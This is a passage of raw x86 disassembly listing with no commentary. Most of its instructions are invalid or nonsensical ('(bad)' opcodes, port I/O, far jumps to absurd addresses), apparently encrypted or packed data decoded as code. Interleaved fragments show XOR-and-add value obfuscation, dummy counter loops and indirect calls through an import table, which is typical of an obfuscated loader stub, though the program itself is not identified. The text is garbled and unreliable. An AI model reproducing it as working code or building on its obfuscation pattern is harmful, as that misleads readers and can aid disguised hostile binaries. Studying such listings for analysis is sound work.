  40e4fd:	(bad)  
  40e4fe:	lahf   
  40e4ff:	cmp    BYTE PTR [ecx-0x59],0x36
  40e503:	cwde   
  40e504:	pop    ecx
  40e505:	and    eax,0x4bca09f3
  40e50a:	lahf   
  40e50b:	(bad)  
  40e50c:	mov    ebx,0xae19d50a
  40e511:	and    al,0x8f
  40e513:	out    0x2e,eax
  40e515:	push   eax
  40e516:	xor    BYTE PTR [esi],dh
  40e518:	(bad)  
  40e519:	adc    ebp,DWORD PTR [ecx+0x3bd28de6]
  40e51f:	test   BYTE PTR [edx+0x6593e7c2],ah
  40e525:	pop    eax
  40e526:	mov    bl,0x7b
  40e528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e529:	test   eax,0x83350d07
  40e52e:	xchg   edx,eax
  40e52f:	sub    BYTE PTR [eax-0x7724e831],0x51
  40e536:	loopne 0x40e5a1
  40e538:	je     0x40e586
  40e53a:	mov    esi,0xf4458bc2
  40e53f:	or     DWORD PTR ds:0x433723,0x43376b
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x43375b,0x43372f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x60f261b8
  40e5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5b5:	stc    
  40e5b6:	shr    DWORD PTR [edx],1
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5a3
  40e5c0:	jge    0x40e637
  40e5c2:	lea    esi,[edi-0x20]
  40e5c5:	nop
  40e5c6:	push   ebx
  40e5c7:	out    0xe,eax
  40e5c9:	(bad)  
  40e5ca:	xor    al,BYTE PTR [ecx]
  40e5cc:	push   ds
  40e5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ce:	in     eax,0xfe
  40e5d0:	push   ebx
  40e5d1:	xor    dh,BYTE PTR [edi-0x49]
  40e5d4:	bound  esp,QWORD PTR [esi]
  40e5d6:	jmp    0x6f7865be
  40e5db:	ror    BYTE PTR [ecx-0x2a],cl
  40e5de:	out    dx,al
  40e5df:	nop
  40e5e0:	call   esi
  40e5e2:	or     eax,0x5059cfa2
  40e5e7:	sub    ecx,DWORD PTR [edx+0x5c9ee35f]
  40e5ed:	inc    esp
  40e5ee:	les    edi,FWORD PTR [ebx-0x56e9b0ea]
  40e5f4:	popf   
  40e5f5:	sbb    cl,BYTE PTR [eax+edi*8+0x24]
  40e5f9:	gs add al,0x4f
  40e5fc:	and    al,0xe1
  40e5fe:	xor    eax,0xd1f8f970
  40e603:	imul   eax,DWORD PTR ds:0x379cb9b0,0x701e319d
  40e60d:	dec    eax
  40e60e:	leave  
  40e60f:	aas    
  40e610:	sub    BYTE PTR [ebx-0x17],dh
  40e613:	pop    DWORD PTR [ebx-0x43ea8b27]
  40e619:	test   BYTE PTR [ebx+0x68],cl
  40e61c:	ror    DWORD PTR [ecx-0x13c74878],1
  40e622:	add    eax,0x874ead47
  40e627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e628:	push   ds
  40e629:	enter  0x7787,0xae
  40e62d:	leave  
  40e62e:	jmp    0x40e5cf
  40e630:	outs   dx,DWORD PTR ds:[esi]
  40e631:	retf   0xd7a0
  40e634:	mov    ecx,0xd3f53b86
  40e639:	test   eax,0x26a321ad
  40e63e:	jge    0x40e5ed
  40e640:	and    dh,bh
  40e642:	rol    BYTE PTR [esi+ecx*2+0x50],1
  40e646:	jae    0x40e617
  40e648:	stc    
  40e649:	jno    0x40e603
  40e64b:	mov    ch,0xd5
  40e64d:	adc    cl,0xa3
  40e650:	lahf   
  40e651:	stc    
  40e652:	mov    esi,0x18f8e691
  40e657:	ss mov ebp,ds
  40e65a:	inc    eax
  40e65b:	call   0x36c0:0xaef3ca4e
  40e662:	mov    edx,DWORD PTR [esi+0x6bcabaeb]
  40e668:	inc    esi
  40e669:	pushf  
  40e66a:	outs   dx,DWORD PTR ds:[esi]
  40e66b:	jg     0x40e628
  40e66d:	in     eax,dx
  40e66e:	cmp    ecx,edx
  40e670:	push   0x27
  40e672:	scas   al,BYTE PTR es:[edi]
  40e673:	dec    esp
  40e674:	in     al,0x82
  40e676:	rcr    DWORD PTR [esi-0x5d6e9949],cl
  40e67c:	test   al,0xfd
  40e67e:	into   
  40e67f:	imul   ecx,DWORD PTR [ebp+ebp*1+0x18b3cfa6],0xffffffeb
  40e687:	dec    ebx
  40e688:	ret    
  40e689:	or     DWORD PTR [esp+eax*2],0x92eb3111
  40e690:	imul   ebx,DWORD PTR [esi+esi*2-0x23],0x88060537
  40e698:	shl    BYTE PTR [ecx+0x6a8d6d91],1
  40e69e:	ds clc 
  40e6a0:	push   cs
  40e6a1:	stos   DWORD PTR es:[edi],eax
  40e6a2:	int3   
  40e6a3:	js     0x40e6b0
  40e6a5:	test   al,0x27
  40e6a7:	fistp  DWORD PTR [esi-0x2d37229e]
  40e6ad:	aad    0x66
  40e6af:	cld    
  40e6b0:	jl     0x40e6ac
  40e6b2:	fstp   DWORD PTR [edi-0x41]
  40e6b5:	or     esi,ebp
  40e6b7:	jnp    0x40e6fb
  40e6b9:	xchg   edi,eax
  40e6ba:	push   ss
  40e6bb:	clc    
  40e6bc:	test   BYTE PTR [ebx+0x21b2112b],bh
  40e6c2:	iret   
  40e6c3:	cmc    
  40e6c4:	mov    ah,0xb4
  40e6c6:	scas   al,BYTE PTR es:[edi]
  40e6c7:	push   cs
  40e6c8:	xchg   esi,eax
  40e6c9:	sbb    BYTE PTR [edi-0x40],bh
  40e6cc:	stos   DWORD PTR es:[edi],eax
  40e6cd:	sub    ecx,DWORD PTR [edi-0xc]
  40e6d0:	mul    DWORD PTR [di-0x5656]
  40e6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6d6:	arpl   WORD PTR [ecx-0x5e64331c],bx
  40e6dc:	xor    al,0x3b
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x5864b6e4]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e780
  40e704:	adc    BYTE PTR [eax],0x22
  40e707:	rol    BYTE PTR ds:0x5264a558,0xa3
  40e70e:	loope  0x40e6c7
  40e710:	(bad)
  40e713:	sbb    al,0x2
  40e715:	mov    ecx,edx
  40e717:	cmc    
  40e718:	in     al,dx
  40e719:	push   eax
  40e71a:	shl    BYTE PTR [ebx],cl
  40e71c:	jl     0x40e77c
  40e71e:	add    al,0x87
  40e720:	ror    dl,cl
  40e722:	mov    ch,0xd1
  40e724:	outs   dx,BYTE PTR ds:[esi]
  40e725:	inc    edi
  40e726:	jmp    0x40e6ec
  40e728:	sub    DWORD PTR [edx+ecx*2],edx
  40e72b:	shl    DWORD PTR ds:0xad3556c9,cl
  40e731:	push   esp
  40e732:	inc    ecx
  40e733:	mov    eax,0x51fed4fb
  40e738:	stc    
  40e739:	nop
  40e73a:	ret    
  40e73b:	xchg   edi,eax
  40e73c:	jb     0x40e78b
  40e73e:	sbb    al,0xad
  40e740:	inc    ecx
  40e741:	bswap  ecx
  40e743:	lods   al,BYTE PTR ds:[esi]
  40e744:	add    BYTE PTR [ebx+edx*8+0x6f677465],0x8a
  40e74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e74d:	cli    
  40e74e:	mov    edx,0xc4c70064
  40e753:	push   eax
  40e754:	shl    BYTE PTR [esi-0x41ac4607],cl
  40e75a:	or     ch,dl
  40e75c:	(bad)  
  40e75e:	inc    eax
  40e75f:	and    eax,0x1fad6dcc
  40e764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e765:	lods   eax,DWORD PTR ds:[esi]
  40e766:	xor    BYTE PTR [esi],dh
  40e768:	not    DWORD PTR [edx+0x74]
  40e76b:	adc    ah,BYTE PTR [esp]
  40e76e:	and    al,0x3a
  40e770:	cmp    eax,0x87b75e01
  40e775:	data16 loope 0x40e74c
  40e778:	dec    edx
  40e779:	lea    edi,[edi-0x741d9784]
  40e77f:	mov    ecx,0xd8219969
  40e784:	dec    esp
  40e785:	sub    DWORD PTR [edx+ebp*8-0x4b],edi
  40e789:	dec    esi
  40e78a:	push   esp
  40e78b:	xchg   esp,eax
  40e78c:	les    eax,FWORD PTR [eax+0x48]
  40e78f:	lock mov WORD PTR [edi],?
  40e792:	dec    edx
  40e793:	jo     0x40e75b
  40e795:	test   dh,ah
  40e797:	push   eax
  40e798:	inc    edx
  40e799:	push   ss
  40e79a:	ins    BYTE PTR es:[edi],dx
  40e79b:	and    DWORD PTR [ebx+0x6c],0x2a
  40e79f:	push   edi
  40e7a0:	push   esi
  40e7a1:	push   esp
  40e7a2:	or     DWORD PTR [ecx],ebx
  40e7a4:	and    esp,edi
  40e7a6:	or     eax,0xb82d57e2
  40e7ab:	cli    
  40e7ac:	popa   
  40e7ad:	cmp    DWORD PTR [ebp+0x7a],ecx
  40e7b0:	jb     0x40e7a8
  40e7b2:	cmp    al,0x71
  40e7b4:	add    edx,0x1b
  40e7b7:	ror    DWORD PTR [edi+0x4e],0xc2
  40e7bb:	aaa    
  40e7bc:	mov    eax,DWORD PTR [ecx]
  40e7be:	fisub  DWORD PTR [ecx+edx*4-0x18]
  40e7c2:	or     DWORD PTR [ecx+0x5a91f24a],edx
  40e7c8:	lods   al,BYTE PTR ds:[esi]
  40e7c9:	or     bl,BYTE PTR [esi]
  40e7cb:	out    dx,al
  40e7cc:	outs   dx,BYTE PTR ds:[esi]
  40e7cd:	data16 aaa 
  40e7cf:	retf   0x5725
  40e7d2:	icebp  
  40e7d3:	cmp    al,0xad
  40e7d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7d6:	dec    eax
  40e7d7:	push   es
  40e7d8:	daa    
  40e7d9:	pop    edx
  40e7da:	add    esi,ebp
  40e7dc:	ret    0xe637
  40e7df:	mov    esi,0x7c946c95
  40e7e4:	cs cwde 
  40e7e6:	dec    ebp
  40e7e7:	xchg   BYTE PTR [ecx+0x120d10d5],dh
  40e7ed:	sub    DWORD PTR [ecx+0x2db9207b],edi
  40e7f3:	push   ss
  40e7f4:	inc    edx
  40e7f5:	mov    WORD PTR [edx+0x6f9b36b6],cs
  40e7fb:	popa   
  40e7fc:	mov    ch,0x7d
  40e7fe:	retf   0x2a2e
  40e801:	mov    edx,DWORD PTR [esi]
  40e803:	mov    eax,ds:0xb3954af
  40e808:	je     0x40e7da
  40e80a:	lods   al,BYTE PTR ds:[esi]
  40e80b:	push   esi
  40e80c:	in     al,0xf0
  40e80e:	ins    DWORD PTR es:[edi],dx
  40e80f:	jge    0x40e7d0
  40e811:	push   0xeff14ea5
  40e816:	into   
  40e817:	ss or  eax,0x2184a212
  40e81d:	sar    BYTE PTR [edx-0x77],1
  40e820:	inc    ebp
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e861
  40e854:	fld    st(6)
  40e856:	(bad)  
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e86b
  40e860:	cli    
  40e861:	pop    esi
  40e862:	sub    al,0x27
  40e864:	jl     0x40e840
  40e866:	inc    esp
  40e867:	cdq    
  40e868:	icebp  
  40e869:	(bad)  
  40e86a:	xor    ebx,DWORD PTR [edi-0x212c44da]
  40e870:	pop    edx
  40e871:	adc    BYTE PTR [edx-0x67],ah
  40e874:	popa   
  40e875:	out    dx,eax
  40e876:	inc    edx
  40e877:	sbb    eax,0x971aa900
  40e87c:	das    
  40e87d:	dec    ecx
  40e87e:	test   DWORD PTR [edi+0x1d2cc4af],eax
  40e884:	sbb    eax,0x4a68eb10
  40e889:	dec    eax
  40e88a:	stos   BYTE PTR es:[edi],al
  40e88b:	cs cmp ah,bl
  40e88e:	pop    ds
  40e88f:	xchg   esi,eax
  40e890:	(bad)  [esi-0x7af7f27f]
  40e896:	xor    al,0xcc
  40e898:	shr    DWORD PTR [esi-0x794bee69],cl
  40e89e:	shl    ah,1
  40e8a0:	xchg   ebp,eax
  40e8a1:	sbb    BYTE PTR [esi+0x5998be68],al
  40e8a7:	jg     0x40e841
  40e8a9:	push   ss
  40e8aa:	fidiv  WORD PTR ds:0x9cbe9290
  40e8b0:	loop   0x40e8a1
  40e8b2:	gs mov bh,0xf0
  40e8b5:	mov    bl,0xfc
  40e8b7:	add    eax,0x94f168dc
  40e8bc:	retf   0x6807
  40e8bf:	(bad)  
  40e8c0:	xchg   esp,eax
  40e8c1:	adc    al,0x32
  40e8c3:	idiv   DWORD PTR [edx+0x10f90350]
  40e8c9:	pop    es
  40e8ca:	and    bl,BYTE PTR [edx+eiz*4+0x5b]
  40e8ce:	hlt    
  40e8cf:	pop    edi
  40e8d0:	cld    
  40e8d1:	xlat   BYTE PTR ds:[ebx]
  40e8d2:	sar    DWORD PTR [eax+0x51eddaf7],cl
  40e8d8:	mov    dl,0x98
  40e8da:	lods   al,BYTE PTR ds:[esi]
  40e8db:	jg     0x40e8d2
  40e8dd:	and    DWORD PTR [ebx+ebx*8+0x2c],ebp
  40e8e1:	outs   dx,DWORD PTR ds:[esi]
  40e8e2:	retf   
  40e8e3:	sub    eax,0x9672dca8
  40e8e8:	inc    ebx
  40e8e9:	push   ds
  40e8ea:	pop    edi
  40e8eb:	sahf   
  40e8ec:	jns    0x40e8d8
  40e8ee:	inc    ecx
  40e8ef:	imul   BYTE PTR [ecx]
  40e8f1:	adc    DWORD PTR [ebp+ebx*8-0x20],0xb46c40de
  40e8f9:	mov    esp,DWORD PTR [ebx+0x32]
  40e8fc:	xor    ecx,0xffffffd2
  40e8ff:	sbb    DWORD PTR [edi],ebx
  40e901:	push   0xffffff99
  40e903:	mov    ch,0x52
  40e905:	cmp    eax,0x90188cbd
  40e90a:	scas   al,BYTE PTR es:[edi]
  40e90b:	pop    es
  40e90c:	fld    st(2)
  40e90e:	xchg   esi,eax
  40e90f:	push   ebx
  40e910:	movd   ebx,mm2
  40e913:	sub    bl,BYTE PTR [esi+edx*2]
  40e916:	das    
  40e917:	sbb    ah,BYTE PTR [esi]
  40e919:	mov    dl,al
  40e91b:	adc    esi,DWORD PTR [ecx]
  40e91d:	mov    ds:0x7dcc739a,al
  40e922:	mov    ecx,DWORD PTR [eax]
  40e924:	xor    al,0x37
  40e926:	cmp    al,0x2f
  40e928:	imul   edi,DWORD PTR [ebx],0x232a3789
  40e92e:	aas    
  40e92f:	enter  0x6d61,0x68
  40e933:	(bad)
  40e937:	fisttp DWORD PTR [esi+0x4fe408d3]
  40e93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e93e:	mov    cl,0xbc
  40e940:	mov    WORD PTR [ebx],ds
  40e942:	lods   al,BYTE PTR ds:[esi]
  40e943:	xor    ecx,ebx
  40e945:	nop
  40e946:	aam    0xc4
  40e948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e949:	ds jo  0x40e961
  40e94c:	xor    eax,DWORD PTR [ecx+0x27]
  40e94f:	inc    ecx
  40e950:	cmp    BYTE PTR ds:0x867a8268,bl
  40e956:	call   0x97e14f88
  40e95b:	ds push ebx
  40e95d:	leave  
  40e95e:	or     bh,al
  40e960:	pusha  
  40e961:	pop    ebp
  40e962:	sbb    BYTE PTR [eax],ch
  40e964:	add    cl,BYTE PTR [edx+ebx*8]
  40e967:	mov    gs,edi
  40e969:	(bad)  
  40e96a:	pop    ebx
  40e96b:	mov    dh,0xcd
  40e96d:	pop    ebp
  40e96e:	test   DWORD PTR [edx],edx
  40e970:	shl    eax,0xdf
  40e973:	addr16 push edi
  40e975:	mov    dh,0x7c
  40e977:	aas    
  40e978:	mov    ah,0xc2
  40e97a:	repz jne 0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x4266ee1d
  40e99c:	xchg   BYTE PTR ss:[esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e951
  40e9a6:	jb     0x40e977
  40e9a8:	mov    BYTE PTR [eax-0x55e15549],cl
  40e9ae:	add    BYTE PTR [eax+0x1cc4ed2a],al
  40e9b4:	repz mov edi,DWORD PTR [esi+ebp*8]
  40e9b8:	je     0x40e9d9
  40e9ba:	ret    
  40e9bb:	jecxz  0x40e9a0
  40e9bd:	push   ss
  40e9be:	sbb    esi,DWORD PTR [edi+ecx*2]
  40e9c1:	mov    ss,ecx
  40e9c3:	mov    dl,0x29
  40e9c5:	(bad)  
  40e9c7:	adc    al,0x9c
  40e9c9:	ret    
  40e9ca:	push   esi
  40e9cb:	sub    ch,BYTE PTR [eax+0x73d14a77]
  40e9d1:	inc    esp
  40e9d2:	ds das 
  40e9d4:	imul   ebx,DWORD PTR [ebp+0x15],0x3f
  40e9d8:	adc    BYTE PTR [eax-0x4c],dh
  40e9db:	inc    esp
  40e9dc:	(bad)  
  40e9dd:	jae    0x40e978
  40e9df:	xchg   edx,eax
  40e9e0:	pop    edi
  40e9e1:	mov    cl,BYTE PTR [edx-0x1d]
  40e9e4:	push   ebp
  40e9e5:	jmp    0xfdb6:0x59685d7b
  40e9ec:	into   
  40e9ed:	mov    WORD PTR [ecx+ebx*4+0xd],cs
  40e9f1:	fild   WORD PTR [ebp+0x1f]
  40e9f4:	in     eax,0x77
  40e9f6:	sbb    dh,0x7
  40e9f9:	into   
  40e9fa:	icebp  
  40e9fb:	int    0x6
  40e9fd:	fidiv  DWORD PTR [ecx-0x7010e34b]
  40ea03:	cdq    
  40ea04:	add    DWORD PTR [esi-0x686f9ba2],esp
  40ea0a:	mov    ebx,0x8f30c8d2
  40ea0f:	sbb    dl,BYTE PTR [esi]
  40ea11:	cli    
  40ea12:	rol    DWORD PTR [ebp+0x512e340d],cl
  40ea18:	add    al,BYTE PTR [edi]
  40ea1a:	pop    ss
  40ea1b:	dec    esp
  40ea1c:	sub    eax,0xbc0f28af
  40ea21:	repz fstp TBYTE PTR [ecx+0x4d]
  40ea25:	mov    ebx,0xa6116019
  40ea2a:	fcomp  QWORD PTR [edi+0x62f14d91]
  40ea30:	add    edx,DWORD PTR [ebp+0x3c9aa4db]
  40ea36:	mov    WORD PTR [eax+0x7a],?
  40ea39:	call   0x8a527b5a
  40ea3e:	aaa    
  40ea3f:	jo     0x40ea8b
  40ea41:	mov    al,0x96
  40ea43:	enter  0x5880,0x6b
  40ea47:	pop    ecx
  40ea48:	adc    BYTE PTR [esi+0x2f],dh
  40ea4b:	ret    0xc25d
  40ea4e:	por    mm2,QWORD PTR [edi+esi*4-0x80]
  40ea53:	dec    ebx
  40ea54:	pushf  
  40ea55:	jecxz  0x40ea6b
  40ea57:	push   eax
  40ea58:	addr16 push 0xffffffb7
  40ea5b:	test   DWORD PTR [eax+0x6b],0xd5c04e1c
  40ea62:	jo     0x40ea06
  40ea64:	iret   
  40ea65:	add    DWORD PTR [eax+0x5d],0xeb4c6e21
  40ea6c:	dec    DWORD PTR [edi]
  40ea6e:	jae    0x40eaa7
  40ea70:	xor    BYTE PTR [ebp-0x5b2354bd],dl
  40ea76:	pop    es
  40ea77:	into   
  40ea78:	adc    al,0xb4
  40ea7a:	pushf  
  40ea7b:	pop    ecx
  40ea7c:	arpl   WORD PTR [ecx-0x13],cx
  40ea7f:	pop    esi
  40ea80:	scas   eax,DWORD PTR es:[edi]
  40ea81:	shl    BYTE PTR [edi-0x497ad04b],cl
  40ea87:	aaa    
  40ea88:	repz jne 0x40ead6
  40ea8b:	ror    BYTE PTR [esi+0x77],1
  40ea8e:	or     esp,DWORD PTR [eax-0x51]
  40ea91:	sbb    al,0xf
  40ea93:	xor    al,0x35
  40ea95:	div    DWORD PTR [edi+edi*2]
  40ea98:	dec    ebx
  40ea99:	out    dx,al
  40ea9a:	sub    cl,cl
  40ea9c:	adc    ch,BYTE PTR [ebp+0x69262300]
  40eaa2:	ror    DWORD PTR [esp+edi*1],0xef
  40eaa6:	inc    ebp
  40eaa7:	fwait
  40eaa8:	mov    BYTE PTR [esi+0x7c2919a2],ah
  40eaae:	jbe    0x40ea6c
  40eab0:	sahf   
  40eab1:	div    bh
  40eab3:	lods   al,BYTE PTR ds:[esi]
  40eab4:	mov    bl,0xeb
  40eab6:	cmp    eax,0x6a4418f6
  40eabb:	call   DWORD PTR [edx+0x29]
  40eabe:	push   edi
  40eabf:	dec    ecx
  40eac0:	pusha  
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433713,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433713,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433713,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433713,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433713
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433713,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433713
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433713,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433753,0x16
  40eb34:	cmp    DWORD PTR ds:0x433753,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433753,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433753
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433753,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433763,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43371b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4337ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    dl,BYTE PTR [ebx+0x77]
  40ebb5:	xor    al,0xac
  40ebb7:	call   0x7e7f:0x547e7ea5
  40ebbe:	jle    0x40ec35
  40ebc0:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40ebc2:	sub    DWORD PTR [ebx+0x5e668318],esi
  40ebc8:	inc    esi
  40ebc9:	test   al,0x1c
  40ebcb:	jb     0x40ec44
  40ebcd:	sar    ch,0x5d
  40ebd0:	dec    esi
  40ebd1:	cwde   
  40ebd2:	push   ecx
  40ebd3:	out    0x4,al
  40ebd5:	(bad)  
  40ebd7:	sub    dh,dh
  40ebd9:	mov    BYTE PTR [edi],dh
  40ebdb:	sbb    eax,0xada6aeb2
  40ebe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebe1:	inc    ebp
  40ebe2:	leave  
  40ebe3:	push   es
  40ebe4:	sbb    DWORD PTR [esi-0x1d],esp
  40ebe7:	popf   
  40ebe8:	cmp    DWORD PTR [eax+0x48f1fd61],ebx
  40ebee:	add    eax,0x4d0cbc21
  40ebf3:	icebp  
  40ebf4:	jo     0x40ec2e
  40ebf6:	xlat   BYTE PTR ds:[ebx]
  40ebf7:	in     eax,0x47
  40ebf9:	fwait
  40ebfa:	add    ch,BYTE PTR [ecx+0x3b]
  40ebfd:	fimul  DWORD PTR [ecx+0x1e526637]
  40ec03:	ret    
  40ec04:	pop    ebx
  40ec05:	xlat   BYTE PTR ds:[ebx]
  40ec07:	push   edx
  40ec08:	scas   al,BYTE PTR es:[edi]
  40ec09:	jmp    0x389fc583
  40ec0e:	mov    ebp,0x32adea82
  40ec13:	arpl   WORD PTR [edi-0xb],bp
  40ec16:	lea    edx,[esi]
  40ec18:	aaa    
  40ec19:	(bad)  
  40ec1a:	pushf  
  40ec1b:	add    BYTE PTR [edx],dh
  40ec1d:	and    al,0x4a
  40ec1f:	push   ebx
  40ec20:	mov    ebp,0x1627d85
  40ec25:	test   al,0xa4
  40ec27:	or     DWORD PTR [ebx+0x16],esi
  40ec2a:	and    edx,DWORD PTR [ebp+0x2d]
  40ec2d:	outs   dx,DWORD PTR ds:[esi]
  40ec2e:	repnz add ebp,0x69
  40ec32:	or     bh,BYTE PTR [edx-0x631d7b1a]
  40ec38:	les    ebx,FWORD PTR [ecx]
  40ec3a:	sbb    BYTE PTR [ebx],cl
  40ec3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec3d:	and    al,0xcd
  40ec3f:	sbb    al,0xc9
  40ec41:	mov    BYTE PTR [ebx],0x1d
  40ec44:	iret   
  40ec45:	cmp    bl,cl
  40ec47:	push   edx
  40ec48:	xchg   esp,eax
  40ec49:	mov    ch,0x7
  40ec4b:	fwait
  40ec4c:	pop    es
  40ec4d:	adc    al,ch
  40ec4f:	mov    ds:0x1403f4bf,al
  40ec54:	inc    edi
  40ec55:	ret    
  40ec56:	and    ah,BYTE PTR [esi]
  40ec58:	(bad)  
  40ec5a:	cli    
  40ec5b:	and    eax,0xe26bb357
  40ec60:	jne    0x40ecaf
  40ec62:	adc    DWORD PTR [edi],esp
  40ec64:	repz sbb edi,ebx
  40ec67:	scas   al,BYTE PTR es:[edi]
  40ec68:	push   ebp
  40ec69:	adc    DWORD PTR [edx+ebx*4+0x4313a6bc],esi
  40ec70:	xchg   ebx,eax
  40ec71:	pop    eax
  40ec72:	lods   al,BYTE PTR ds:[esi]
  40ec73:	out    0x3,al
  40ec75:	jp     0x40ec61
  40ec77:	aam    0x3e
  40ec79:	mov    ch,0xae
  40ec7b:	imul   ecx,DWORD PTR [ebx+0x56],0xffffffc2
  40ec7f:	imul   edx,DWORD PTR [edx],0xffffffad
  40ec82:	sbb    ebx,edi
  40ec84:	test   BYTE PTR [esi-0x278883e5],0x3c
  40ec8b:	jle    0x40ec3b
  40ec8d:	xor    al,0xd0
  40ec8f:	mov    ds:0x97a2a4a7,al
  40ec94:	fisub  DWORD PTR [ebp-0x31]
  40ec97:	ds hlt 
  40ec99:	or     dh,0xc
  40ec9c:	stc    
  40ec9d:	cmc    
  40ec9e:	sbb    cl,dh
  40eca0:	fs mov ebx,0xba3f3732
  40eca6:	pop    ebx
  40eca7:	push   esi
  40eca8:	int    0x1
  40ecaa:	aaa    
  40ecab:	outs   dx,DWORD PTR ds:[esi]
  40ecac:	mov    ebp,ecx
  40ecae:	cmp    al,0x62
  40ecb0:	push   ecx
  40ecb1:	retf   0xf29c
  40ecb4:	les    eax,FWORD PTR [eax-0x6b]
